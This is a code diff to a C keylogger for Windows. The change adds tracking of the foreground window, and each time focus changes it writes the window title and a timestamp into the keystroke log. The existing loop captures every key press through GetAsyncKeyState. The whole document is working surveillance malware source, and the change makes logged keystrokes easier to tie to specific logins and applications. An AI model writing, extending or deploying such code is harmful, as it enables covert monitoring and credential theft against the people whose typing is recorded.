@@ -1,4 +1,9 @@
 #include "Variables.h"
+#include <stdio.h>
+#include <time.h>
+
+time_t TimeWindowChange;
+struct tm* TimeWindow;
 
 DWORD StartLogger(LPVOID Parameter)
 {
@@ -12,12 +17,33 @@ DWORD StartLogger(LPVOID Parameter)
 	}
 
 	IsKeyLoggerOn = 1;
+	HWND LastHandle = NULL;
 
 	while (1)
 	{
 		Sleep(10);
 		for (int Key = 0x01; Key < 0xFE; Key++)
 		{
+			HWND CurrentHandle = GetForegroundWindow();
+			if (CurrentHandle != LastHandle)
+			{
+				LastHandle = CurrentHandle;
+				char NewWindowTitle[255] = { 0 };
+				int GotTitle = GetWindowTextA(CurrentHandle, NewWindowTitle, sizeof(NewWindowTitle));
+				if (GotTitle == 0)
+				{
+					LastHandle = NULL;
+				}
+				else
+				{
+					time(&TimeWindowChange);
+					TimeWindow = localtime(&TimeWindowChange);
+					char TitleAndDateBuffer[512] = { 0 };
+					snprintf(TitleAndDateBuffer, sizeof(TitleAndDateBuffer), "\n[KEYLOGGER INFO] [Changed Focused Window At: %02d/%02d/%04d %02d:%02d:%02d] - Window Title: '%s'\n", TimeWindow->tm_mday, TimeWindow->tm_mon + 1, TimeWindow->tm_year + 1900, TimeWindow->tm_hour, TimeWindow->tm_min, TimeWindow->tm_sec, NewWindowTitle);
+					fputs(TitleAndDateBuffer, fp);
+					fflush(fp);
+				}
+			}
 			if (GetAsyncKeyState(Key) & 0x0001)
 			{
 				if (Key >= '0' && Key <= '9')
